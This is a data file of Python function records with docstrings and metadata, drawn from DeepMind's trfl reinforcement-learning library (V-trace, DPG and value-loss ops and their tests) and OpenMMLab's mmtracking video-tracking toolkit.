{"docstring": "\"\"\"Computes action log-probs from policy logits and actions.\n\nIn the notation used throughout documentation and comments, T refers to the\ntime dimension ranging from 0 to T-1. B refers to the batch size and\nNUM_ACTIONS refers to the number of actions.\n\nArgs:\n  policy_logits: A float32 tensor of shape `[T, B, NUM_ACTIONS]` with\n    un-normalized log-probabilities parameterizing a softmax policy.\n  actions: An int32 tensor of shape `[T, B]` with actions.\n\nReturns:\n  A float32 tensor of shape `[T, B]` corresponding to the sampling log\n  probability of the chosen action w.r.t. the policy.\n\"\"\"\n", "func_signal": "def log_probs_from_logits_and_actions(policy_logits, actions):\n", "code": "policy_logits = tf.convert_to_tensor(policy_logits, dtype=tf.float32)\nactions = tf.convert_to_tensor(actions, dtype=tf.int32)\n\npolicy_logits.shape.assert_has_rank(3)\nactions.shape.assert_has_rank(2)\n\nreturn -tf.nn.sparse_softmax_cross_entropy_with_logits(\n    logits=policy_logits, labels=actions)", "path": "trfl/trfl/vtrace_ops.py", "commit_date": "2020-04-16 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests no gradient propagates through things other than v_tm1.\"\"\"\n# Gradients are only defined for v_tm1, not any other input.\n", "func_signal": "def testNoOtherGradients(self):\n", "code": "gradients = tf.gradients([self.value_learning.loss],\n                         [self.v_t, self.r_t, self.pcont_t])\nself.assertEqual(gradients, [None] * len(gradients))", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that loss == 0.5 * td_error^2.\"\"\"\n", "func_signal": "def testLoss(self):\n", "code": "with self.test_session() as sess:\n  # Loss is 0.5 * td_error^2\n  self.assertAllClose(\n      sess.run(self.loss_op),\n      [2, 2, 2, 2, 1.125, 0.5, 2, 0.5, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests V-trace calculated from logits.\"\"\"\n", "func_signal": "def testVTraceFromLogits(self, batch_size):\n", "code": "seq_len = 5\nnum_actions = 3\nclip_rho_threshold = None  # No clipping.\nclip_pg_rho_threshold = None  # No clipping.\n\n# Intentionally leaving shapes unspecified to test if V-trace can\n# deal with that.\nplaceholders = {\n    # T, B, NUM_ACTIONS\n    'behaviour_policy_logits':\n        tf.placeholder(dtype=tf.float32, shape=[None, None, None]),\n    # T, B, NUM_ACTIONS\n    'target_policy_logits':\n        tf.placeholder(dtype=tf.float32, shape=[None, None, None]),\n    'actions':\n        tf.placeholder(dtype=tf.int32, shape=[None, None]),\n    'discounts':\n        tf.placeholder(dtype=tf.float32, shape=[None, None]),\n    'rewards':\n        tf.placeholder(dtype=tf.float32, shape=[None, None]),\n    'values':\n        tf.placeholder(dtype=tf.float32, shape=[None, None]),\n    'bootstrap_value':\n        tf.placeholder(dtype=tf.float32, shape=[None]),\n}\n\nfrom_logits_output = vtrace_ops.vtrace_from_logits(\n    clip_rho_threshold=clip_rho_threshold,\n    clip_pg_rho_threshold=clip_pg_rho_threshold,\n    **placeholders)\n\ntarget_log_probs = vtrace_ops.log_probs_from_logits_and_actions(\n    placeholders['target_policy_logits'], placeholders['actions'])\nbehaviour_log_probs = vtrace_ops.log_probs_from_logits_and_actions(\n    placeholders['behaviour_policy_logits'], placeholders['actions'])\nlog_rhos = target_log_probs - behaviour_log_probs\nground_truth = (log_rhos, behaviour_log_probs, target_log_probs)\n\nvalues = {\n    'behaviour_policy_logits':\n        _shaped_arange(seq_len, batch_size, num_actions),\n    'target_policy_logits':\n        _shaped_arange(seq_len, batch_size, num_actions),\n    'actions':\n        np.random.randint(0, num_actions - 1, size=(seq_len, batch_size)),\n    'discounts':\n        np.array(  # T, B where B_i: [0.9 / (i+1)] * T\n            [[0.9 / (b + 1)\n              for b in range(batch_size)]\n             for _ in range(seq_len)]),\n    'rewards':\n        _shaped_arange(seq_len, batch_size),\n    'values':\n        _shaped_arange(seq_len, batch_size) / batch_size,\n    'bootstrap_value':\n        _shaped_arange(batch_size) + 1.0,  # B\n}\n\nfeed_dict = {placeholders[k]: v for k, v in values.items()}\nwith self.test_session() as session:\n  from_logits_output_v = session.run(\n      from_logits_output, feed_dict=feed_dict)\n  (ground_truth_log_rhos, ground_truth_behaviour_action_log_probs,\n   ground_truth_target_action_log_probs) = session.run(\n       ground_truth, feed_dict=feed_dict)\n\n# Calculate V-trace using the ground truth logits.\nfrom_iw = vtrace_ops.vtrace_from_importance_weights(\n    log_rhos=ground_truth_log_rhos,\n    discounts=values['discounts'],\n    rewards=values['rewards'],\n    values=values['values'],\n    bootstrap_value=values['bootstrap_value'],\n    clip_rho_threshold=clip_rho_threshold,\n    clip_pg_rho_threshold=clip_pg_rho_threshold)\n\nwith self.test_session() as session:\n  from_iw_v = session.run(from_iw)\n\nself.assertAllClose(from_iw_v.vs, from_logits_output_v.vs)\nself.assertAllClose(from_iw_v.pg_advantages,\n                    from_logits_output_v.pg_advantages)\nself.assertAllClose(ground_truth_behaviour_action_log_probs,\n                    from_logits_output_v.behaviour_action_log_probs)\nself.assertAllClose(ground_truth_target_action_log_probs,\n                    from_logits_output_v.target_action_log_probs)\nself.assertAllClose(ground_truth_log_rhos, from_logits_output_v.log_rhos)", "path": "trfl/trfl/vtrace_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests log_probs_from_logits_and_actions.\"\"\"\n", "func_signal": "def testLogProbsFromLogitsAndActions(self, batch_size):\n", "code": "seq_len = 7\nnum_actions = 3\n\npolicy_logits = _shaped_arange(seq_len, batch_size, num_actions) + 10\nactions = np.random.randint(\n    0, num_actions - 1, size=(seq_len, batch_size), dtype=np.int32)\n\naction_log_probs_tensor = vtrace_ops.log_probs_from_logits_and_actions(\n    policy_logits, actions)\n\n# Ground Truth\n# Using broadcasting to create a mask that indexes action logits\naction_index_mask = actions[..., None] == np.arange(num_actions)\n\ndef index_with_mask(array, mask):\n  return array[mask].reshape(*array.shape[:-1])\n\n# Note: Normally log(softmax) is not a good idea because it's not\n# numerically stable. However, in this test we have well-behaved values.\nground_truth_v = index_with_mask(\n    np.log(_softmax(policy_logits)), action_index_mask)\n\nwith self.test_session() as session:\n  self.assertAllClose(ground_truth_v, session.run(action_log_probs_tensor))", "path": "trfl/trfl/vtrace_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Test one of many possible errors in shape of inputs.\"\"\"\n", "func_signal": "def testInconsistentRankInputsForIW(self):\n", "code": "placeholders = {\n    'log_rhos': tf.placeholder(dtype=tf.float32, shape=[None, None, 1]),\n    'discounts': tf.placeholder(dtype=tf.float32, shape=[None, None, 1]),\n    'rewards': tf.placeholder(dtype=tf.float32, shape=[None, None, 42]),\n    'values': tf.placeholder(dtype=tf.float32, shape=[None, None, 42]),\n    # Should be [None, 42].\n    'bootstrap_value': tf.placeholder(dtype=tf.float32, shape=[None])\n}\nwith self.assertRaisesRegexp(ValueError, 'must have rank 2'):\n  vtrace_ops.vtrace_from_importance_weights(**placeholders)", "path": "trfl/trfl/vtrace_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that the gradients of negative loss are equal to the td_error.\"\"\"\n", "func_signal": "def testGradVtm1(self):\n", "code": "with self.test_session() as sess:\n  # Take gradients of the negative loss, so that the tests here check the\n  # values propagated during gradient _descent_, rather than _ascent_.\n  gradients = tf.gradients([-self.value_learning.loss], [self.v_tm1])\n  grad_v_tm1 = sess.run(gradients[0])\n  self.assertAllClose(grad_v_tm1, [-2, -2, -2, -2, -1.5, -1, -2, -1, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Tests that the gradients of negative loss are equal to the td_error.\"\"\"\n", "func_signal": "def testGradVtm1(self):\n", "code": "with self.test_session() as sess:\n  # Take gradients of the negative loss, so that the tests here check the\n  # values propagated during gradient _descent_, rather than _ascent_.\n  gradients = tf.gradients([-self.loss_op], [self.v_tm1])\n  grad_v_tm1 = sess.run(gradients[0])\n  self.assertAllClose(grad_v_tm1, [-2, -2, -2, -2, -1.5, -1, -2, -1, 0])", "path": "trfl/trfl/value_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Equivalent to `values[:, indices]`.\n\nPerforms indexing on batches and sequence-batches by reducing over\nzero-masked values. Compared to indexing with `tf.gather` this approach is\nmore general and TPU-friendly, but may be less efficient if `num_values`\nis large. It works with tensors whose shapes are unspecified or\npartially-specified, but this op will only do shape checking on shape\ninformation available at graph construction time. When complete shape\ninformation is absent, certain shape incompatibilities may not be detected at\nruntime! See `indexing_ops_test` for detailed examples.\n\nArgs:\n  values: tensor of shape `[B, num_values]` or `[T, B, num_values]`\n  indices: tensor of shape `[B]` or `[T, B]` containing indices.\n  keepdims: If `True`, the returned tensor will have an added 1 dimension at\n    the end (e.g. `[B, 1]` or `[T, B, 1]`).\n\nReturns:\n  Tensor of shape `[B]` or `[T, B]` containing values for the given indices.\n\nRaises: ValueError if values and indices have sizes that are known\n  statically (i.e. during graph construction), and those sizes are not\n  compatible (see shape descriptions in Args list above).\n\"\"\"\n", "func_signal": "def batched_index(values, indices, keepdims=None):\n", "code": "with tf.name_scope(\"batch_indexing\", values=[values, indices]):\n  values = tf.convert_to_tensor(values)\n  indices = tf.convert_to_tensor(indices)\n  assert_compatible_shapes(values.shape, indices.shape)\n\n  one_hot_indices = tf.one_hot(\n      indices, tf.shape(values)[-1], dtype=values.dtype)\n  return tf.reduce_sum(values * one_hot_indices, axis=-1, keepdims=keepdims)", "path": "trfl/trfl/indexing_ops.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Implements the Deterministic Policy Gradient (DPG) loss as a TensorFlow Op.\n\nThis op implements the loss for the `actor`, the `critic` can instead be\nupdated by minimizing the `value_ops.td_learning` loss.\n\nSee \"Deterministic Policy Gradient Algorithms\" by Silver, Lever, Heess,\nDegris, Wierstra, Riedmiller (http://proceedings.mlr.press/v32/silver14.pdf).\n\nArgs:\n  q_max: Tensor holding Q-values generated by Q network with the input of\n    (state, a_max) pair, shape `[B]`.\n  a_max: Tensor holding the optimal action, shape `[B, action_dimension]`.\n  dqda_clipping: `int` or `float`, clips the gradient dqda element-wise\n    between `[-dqda_clipping, dqda_clipping]`.\n  clip_norm: Whether to perform dqda clipping on the vector norm of the last\n    dimension, or component wise (default).\n  name: name to prefix ops created within this op.\n\nReturns:\n  A namedtuple with fields:\n\n  * `loss`: a tensor containing the batch of losses, shape `[B]`.\n  * `extra`: a namedtuple with fields:\n      * `q_max`: Tensor holding the optimal Q values, `[B]`.\n      * `a_max`: Tensor holding the optimal action, `[B, action_dimension]`.\n      * `dqda`: Tensor holding the derivative dq/da, `[B, action_dimension]`.\n\nRaises:\n  ValueError: If `q_max` doesn't depend on `a_max` or if `dqda_clipping <= 0`.\n\"\"\"\n\n# DPG op.\n", "func_signal": "def dpg(q_max, a_max, dqda_clipping=None, clip_norm=False, name=\"DpgLearning\"):\n", "code": "with tf.name_scope(name, values=[q_max, a_max]):\n\n  # Calculate the gradient dq/da.\n  dqda = tf.gradients([q_max], [a_max])[0]\n\n  # Check that `q_max` depends on `a_max`.\n  if dqda is None:\n    raise ValueError(\"q_max needs to be a function of a_max\")\n\n  # Clipping the gradient dq/da.\n  if dqda_clipping is not None:\n    if dqda_clipping <= 0:\n      raise ValueError(\"dqda_clipping should be bigger than 0, {} found\"\n                       .format(dqda_clipping))\n    if clip_norm:\n      dqda = tf.clip_by_norm(dqda, dqda_clipping, axes=-1)\n    else:\n      dqda = tf.clip_by_value(dqda, -1. * dqda_clipping, dqda_clipping)\n\n  # Target_a ensures correct gradient calculated during backprop.\n  target_a = dqda + a_max\n  # Stop the gradient going through Q network when backprop.\n  target_a = tf.stop_gradient(target_a)\n  # Gradient only go through actor network.\n  loss = 0.5 * tf.reduce_sum(tf.square(target_a - a_max), axis=-1)\n  return base_ops.LossOutput(\n      loss, DPGExtra(q_max=q_max, a_max=a_max, dqda=dqda))", "path": "trfl/trfl/dpg_ops.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "# A sequence of length 2, batch size 1, 3 possible actions.\n", "func_signal": "def testLossSequence(self, is_multi_actions, normalise_entropy):\n", "code": "num_actions = 3\npolicy_logits = [[[0., 0., 1.]], [[0., 1., 0.]]]\nactions = [[0], [1]]\nbaseline_values = [[0.2], [0.3]]\nrewards = [[0.4], [0.5]]\npcontinues = [[0.9], [0.8]]\nbootstrap_value = [0.1]\nbaseline_cost = 0.15\nentropy_cost = 0.25\n\nif is_multi_actions:\n  num_action_components = 3\n  policy_logits_nest = [tf.constant(policy_logits, dtype=tf.float32)\n                        for _ in xrange(num_action_components)]\n  actions_nest = [tf.constant(actions, dtype=tf.int32)\n                  for _ in xrange(num_action_components)]\nelse:\n  num_action_components = 1\n  policy_logits_nest = tf.constant(policy_logits, dtype=tf.float32)\n  actions_nest = tf.constant(actions, dtype=tf.int32)\n\nloss, extra = pg_ops.sequence_advantage_actor_critic_loss(\n    policy_logits_nest,\n    tf.constant(baseline_values, dtype=tf.float32),\n    actions_nest,\n    tf.constant(rewards, dtype=tf.float32),\n    tf.constant(pcontinues, dtype=tf.float32),\n    tf.constant(bootstrap_value, dtype=tf.float32),\n    baseline_cost=baseline_cost,\n    entropy_cost=entropy_cost,\n    normalise_entropy=normalise_entropy)\n\n# Manually calculate the discounted returns.\nreturn1 = 0.5 + 0.8 * 0.1\nreturn0 = 0.4 + 0.9 * return1\n\nwith self.test_session() as sess:\n  # Discounted returns\n  self.assertAllClose(sess.run(extra.discounted_returns),\n                      [[return0], [return1]])\n\n  # Advantages\n  advantages = [return0 - baseline_values[0][0],\n                return1 - baseline_values[1][0]]\n  self.assertAllClose(sess.run(extra.advantages),\n                      [[adv] for adv in advantages])\n\n  # Baseline\n  expected_baseline_loss = baseline_cost*sum([0.5 * adv**2 for adv in\n                                              advantages])\n  self.assertAllClose(\n      sess.run(extra.baseline_loss), [expected_baseline_loss])\n\n  # Policy Gradient loss\n  #   loss = sum_t(action_value*(-logits[action] +\n  #                              log(sum_a(exp(logits[a])))))\n  #\n  # The below takes advantage of there only being one minibatch dim.\n  normalise = lambda logits: np.log(np.exp(logits).sum())\n  batch = 0\n  expected_policy_gradient_loss = num_action_components * sum([\n      advantages[0]*(-(policy_logits[0][batch][actions[0][batch]]) +\n                     normalise(policy_logits[0])),\n      advantages[1]*(-(policy_logits[1][batch][actions[1][batch]]) +\n                     normalise(policy_logits[1])),\n  ])\n  self.assertAllClose(sess.run(extra.policy_gradient_loss),\n                      [expected_policy_gradient_loss])\n\n  # Entropy, calculated as per discrete_policy_entropy tests.\n  expected_entropy = num_action_components*0.97533*2\n  expected_entropy_loss = -entropy_cost*expected_entropy\n  if normalise_entropy:\n    expected_entropy_loss /= (num_action_components * np.log(num_actions))\n  self.assertAllClose(sess.run(extra.entropy),\n                      [expected_entropy], atol=1e-4)\n  self.assertAllClose(sess.run(extra.entropy_loss), [expected_entropy_loss],\n                      atol=1e-4)\n\n  # Total loss\n  expected_loss = [expected_entropy_loss + expected_policy_gradient_loss +\n                   expected_baseline_loss]\n  self.assertAllClose(sess.run(loss), expected_loss, atol=1e-4)", "path": "trfl/trfl/discrete_policy_gradient_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Check shapes of the indices and the tensor to be indexed.\n\nIf all input shapes are known statically, obtain shapes of arguments and\nperform compatibility checks. Otherwise, print a warning. The only check\nwe cannot perform statically (and do not attempt elsewhere) is making\nsure that each action index in actions is in [0, num_actions).\n\nArgs:\n  value_shape: static shape of the values.\n  index_shape: static shape of the indices.\n\"\"\"\n# note: rank-0 \"[]\" TensorShape is still True.\n", "func_signal": "def assert_compatible_shapes(value_shape, index_shape):\n", "code": "if value_shape and index_shape:\n  try:\n    msg = (\"Shapes of \\\"values\\\" and \\\"indices\\\" do not correspond to \"\n           \"minibatch (2-D) or sequence-minibatch (3-D) indexing\")\n    assert (value_shape.ndims, index_shape.ndims) in [(2, 1), (3, 2)], msg\n    msg = (\"\\\"values\\\" and \\\"indices\\\" have incompatible shapes of {} \"\n           \"and {}, respectively\").format(value_shape, index_shape)\n    assert value_shape[:-1].is_compatible_with(index_shape), msg\n  except AssertionError as e:\n    raise ValueError(e)  # Convert AssertionError to ValueError.\n\nelse:  # No shape information is known ahead of time.\n  tf.logging.warning(\n      \"indexing function cannot get shapes for tensors \\\"values\\\" and \"\n      \"\\\"indices\\\" at construction time, and so can't check that their \"\n      \"shapes are valid or compatible. Incorrect indexing may occur at \"\n      \"runtime without error!\")", "path": "trfl/trfl/indexing_ops.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Checks support for additional dimensions in inputs.\"\"\"\n", "func_signal": "def testHigherRankInputsForIW(self):\n", "code": "placeholders = {\n    'log_rhos': tf.placeholder(dtype=tf.float32, shape=[None, None, 1]),\n    'discounts': tf.placeholder(dtype=tf.float32, shape=[None, None, 1]),\n    'rewards': tf.placeholder(dtype=tf.float32, shape=[None, None, 42]),\n    'values': tf.placeholder(dtype=tf.float32, shape=[None, None, 42]),\n    'bootstrap_value': tf.placeholder(dtype=tf.float32, shape=[None, 42])\n}\noutput = vtrace_ops.vtrace_from_importance_weights(**placeholders)\nself.assertEqual(output.vs.shape.as_list()[-1], 42)", "path": "trfl/trfl/vtrace_ops_test.py", "commit_date": "2020-01-15 00:00:00", "repo_name": "google-deepmind/trfl", "stars": 3139, "license": "apache-2.0", "language": "python", "size": 291}
{"docstring": "\"\"\"Compute the flow of images pairs.\n\nArgs:\n    imgs (Tensor): of shape (N, 6, H, W) encoding input images pairs.\n        Typically these should be mean centered and std scaled.\n    img_metas (list[dict]): list of image information dict where each\n        dict has: 'img_shape', 'scale_factor', 'flip', and may also\n        contain 'filename', 'ori_shape', 'pad_shape', and\n        'img_norm_cfg'. For details on the values of these keys see\n        `mmtrack/datasets/pipelines/formatting.py:VideoCollect`.\n\nReturns:\n    Tensor: of shape (N, 2, H, W) encoding flow of images pairs.\n\"\"\"\n", "func_signal": "def forward(self, imgs, img_metas):\n", "code": "x = self.prepare_imgs(imgs, img_metas)\nconv_outs = []\nfor i, conv_name in enumerate(self.conv_layers, 1):\n    conv_layer = getattr(self, conv_name)\n    for module in conv_layer:\n        x = module(x)\n    if i in self.out_indices:\n        conv_outs.append(x)\n\nnum_outs = len(conv_outs)\nfor i, deconv_name, flow_name, upflow_name in zip(\n        range(1, num_outs)[::-1], self.deconv_layers[::-1],\n        self.flow_layers[::-1], self.upflow_layers[::-1]):\n    deconv_layer = getattr(self, deconv_name)\n    flow_layer = getattr(self, flow_name)\n    upflow_layer = getattr(self, upflow_name)\n\n    if i == num_outs - 1:\n        concat_out = conv_outs[i]\n    flow = flow_layer(concat_out)\n    upflow = self.crop_like(upflow_layer(flow), conv_outs[i - 1])\n    deconv_out = self.crop_like(\n        deconv_layer(concat_out), conv_outs[i - 1])\n    concat_out = torch.cat((conv_outs[i - 1], deconv_out, upflow),\n                           dim=1)\n\nflow = self.predict_flow(concat_out)\nflow = torch.nn.functional.interpolate(\n    flow,\n    scale_factor=4 / self.img_scale_factor,\n    mode='bilinear',\n    align_corners=False)\nflow *= 4 / self.img_scale_factor\nflow *= self.flow_scale_factor\n\nreturn flow", "path": "mmtracking/mmtrack/models/motion/flownet_simple.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Prepare results for image (e.g. the annotation information, ...).\"\"\"\n", "func_signal": "def prepare_results(self, img_info):\n", "code": "results = super().prepare_results(img_info)\nif self.detections is not None:\n    if isinstance(self.detections, dict):\n        indice = img_info['file_name']\n    elif isinstance(self.detections, list):\n        indice = self.img_ids.index(img_info['id'])\n    results['detections'] = self.detections[indice]\nreturn results", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Format the results to txts (standard format for MOT Challenge).\n\nArgs:\n    results (dict(list[ndarray])): Testing results of the dataset.\n    resfile_path (str, optional): Path to save the formatted results.\n        Defaults to None.\n    metrics (list[str], optional): The results of the specifc metrics\n        will be formatted.. Defaults to ['track'].\n\nReturns:\n    tuple: (resfiles, names, tmp_dir), resfiles is a dict containing\n    the filepaths, names is a list containing the name of the\n    videos, tmp_dir is the temporal directory created for saving\n    files.\n\"\"\"\n", "func_signal": "def format_results(self, results, resfile_path=None, metrics=['track']):\n", "code": "assert isinstance(results, dict), 'results must be a dict.'\nif resfile_path is None:\n    tmp_dir = tempfile.TemporaryDirectory()\n    resfile_path = tmp_dir.name\nelse:\n    tmp_dir = None\n    if osp.exists(resfile_path):\n        print_log('remove previous results.', self.logger)\n        import shutil\n        shutil.rmtree(resfile_path)\n\nresfiles = dict()\nfor metric in metrics:\n    resfiles[metric] = osp.join(resfile_path, metric)\n    os.makedirs(resfiles[metric], exist_ok=True)\n\ninds = [i for i, _ in enumerate(self.data_infos) if _['frame_id'] == 0]\nnum_vids = len(inds)\nassert num_vids == len(self.vid_ids)\ninds.append(len(self.data_infos))\nvid_infos = self.coco.load_vids(self.vid_ids)\nnames = [_['name'] for _ in vid_infos]\n\nfor i in range(num_vids):\n    for metric in metrics:\n        formatter = getattr(self, f'format_{metric}_results')\n        formatter(results[f'{metric}_results'][inds[i]:inds[i + 1]],\n                  self.data_infos[inds[i]:inds[i + 1]],\n                  f'{resfiles[metric]}/{names[i]}.txt')\n\nreturn resfiles, names, tmp_dir", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Initialize the training targets based on the output size\n`score_maps_size` of network.\"\"\"\n", "func_signal": "def _get_init_targets(self, gt_bbox, score_maps_size):\n", "code": "num_base_anchors = self.anchor_generator.num_base_anchors[0]\nlabels = torch.zeros((num_base_anchors, score_maps_size[0],\n                      score_maps_size[1])).to(gt_bbox.device).long()\nlabels_weights = torch.zeros((num_base_anchors, score_maps_size[0],\n                              score_maps_size[1])).to(gt_bbox.device)\nbbox_targets = torch.zeros((4, num_base_anchors, score_maps_size[0],\n                            score_maps_size[1])).to(gt_bbox.device)\nbbox_weights = torch.zeros((num_base_anchors, score_maps_size[0],\n                            score_maps_size[1])).to(gt_bbox.device)\nreturn labels, labels_weights, bbox_targets, bbox_weights", "path": "mmtracking/mmtrack/models/track_heads/siamese_rpn_head.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Format detection results.\"\"\"\n", "func_signal": "def format_bbox_results(self, results, infos, resfile):\n", "code": "with open(resfile, 'wt') as f:\n    for res, info in zip(results, infos):\n        if 'mot_frame_id' in info:\n            frame = info['mot_frame_id']\n        else:\n            frame = info['frame_id'] + 1\n        bboxes, labels = restore_result(res)\n        for bbox, label in zip(bboxes, labels):\n            x1, y1, x2, y2, conf = bbox\n            f.writelines(\n                f'{frame},-1,{x1:.3f},{y1:.3f},{(x2-x1):.3f},' +\n                f'{(y2-y1):.3f},{conf:.3f}\\n')\n    f.close()", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Matching objects according to ground truth `instance_ids`.\n\nArgs:\n    instance_ids (ndarray): of shape (N1, ).\n    ref_instance_ids (ndarray): of shape (N2, ).\n\nReturns:\n    tuple: Matching results which contain the indices of the\n    matched target.\n\"\"\"\n", "func_signal": "def _match_gts(self, instance_ids, ref_instance_ids):\n", "code": "ins_ids = list(instance_ids)\nref_ins_ids = list(ref_instance_ids)\nmatch_indices = np.array([\n    ref_ins_ids.index(i) if (i in ref_ins_ids and i > 0) else -1\n    for i in ins_ids\n])\nref_match_indices = np.array([\n    ins_ids.index(i) if (i in ins_ids and i > 0) else -1\n    for i in ref_ins_ids\n])\nreturn match_indices, ref_match_indices", "path": "mmtracking/mmtrack/datasets/pipelines/processing.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Parse bbox and mask annotation.\n\nArgs:\n    ann_info (list[dict]): Annotation info of an image.\n    with_mask (bool): Whether to parse mask annotations.\n\nReturns:\n    dict: A dict containing the following keys: bboxes, bboxes_ignore,\\\n    labels, masks, seg_map. \"masks\" are raw annotations and not \\\n    decoded into binary masks.\n\"\"\"\n", "func_signal": "def _parse_ann_info(self, img_info, ann_info):\n", "code": "gt_bboxes = []\ngt_labels = []\ngt_bboxes_ignore = []\ngt_instance_ids = []\n\nfor i, ann in enumerate(ann_info):\n    if (not self.test_mode) and (ann['visibility'] <\n                                 self.visibility_thr):\n        continue\n    x1, y1, w, h = ann['bbox']\n    inter_w = max(0, min(x1 + w, img_info['width']) - max(x1, 0))\n    inter_h = max(0, min(y1 + h, img_info['height']) - max(y1, 0))\n    if inter_w * inter_h == 0:\n        continue\n    if ann['area'] <= 0 or w < 1 or h < 1:\n        continue\n    if ann['category_id'] not in self.cat_ids:\n        continue\n    bbox = [x1, y1, x1 + w, y1 + h]\n    if ann.get('ignore', False) or ann.get('iscrowd', False):\n        # note: normally no `iscrowd` for MOT17Dataset\n        gt_bboxes_ignore.append(bbox)\n    else:\n        gt_bboxes.append(bbox)\n        gt_labels.append(self.cat2label[ann['category_id']])\n        gt_instance_ids.append(ann['instance_id'])\n\nif gt_bboxes:\n    gt_bboxes = np.array(gt_bboxes, dtype=np.float32)\n    gt_labels = np.array(gt_labels, dtype=np.int64)\n    gt_instance_ids = np.array(gt_instance_ids, dtype=np.int64)\nelse:\n    gt_bboxes = np.zeros((0, 4), dtype=np.float32)\n    gt_labels = np.array([], dtype=np.int64)\n    gt_instance_ids = np.array([], dtype=np.int64)\n\nif gt_bboxes_ignore:\n    gt_bboxes_ignore = np.array(gt_bboxes_ignore, dtype=np.float32)\nelse:\n    gt_bboxes_ignore = np.zeros((0, 4), dtype=np.float32)\n\nann = dict(\n    bboxes=gt_bboxes,\n    labels=gt_labels,\n    bboxes_ignore=gt_bboxes_ignore,\n    instance_ids=gt_instance_ids)\n\nreturn ann", "path": "mmtracking/mmtrack/datasets/mot_challenge_dataset.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
{"docstring": "\"\"\"Generate 2D hanning window.\n\nArgs:\n    featmap_sizes (list[torch.size]): List of torch.size recording the\n        resolution (height, width) of the multi-level feature maps.\n    device (str): Device the tensor will be put on. Defaults to 'cuda'.\n\nReturns:\n    list[Tensor]: List of 2D hanning window with shape\n    (num_base_anchors[i] * featmap_sizes[i][0] * featmap_sizes[i][1]).\n\"\"\"\n", "func_signal": "def gen_2d_hanning_windows(self, featmap_sizes, device='cuda'):\n", "code": "assert self.num_levels == len(featmap_sizes)\nmulti_level_windows = []\nfor i in range(self.num_levels):\n    hanning_h = np.hanning(featmap_sizes[i][0])\n    hanning_w = np.hanning(featmap_sizes[i][1])\n    window = np.outer(hanning_h, hanning_w)\n    window = np.tile(window.flatten(), self.num_base_anchors[i])\n    multi_level_windows.append(torch.from_numpy(window).to(device))\nreturn multi_level_windows", "path": "mmtracking/mmtrack/core/anchor/sot_anchor_generator.py", "commit_date": "2020-12-29 00:00:00", "repo_name": "open-mmlab/mmtracking", "stars": 3302, "license": "apache-2.0", "language": "python", "size": 2984}
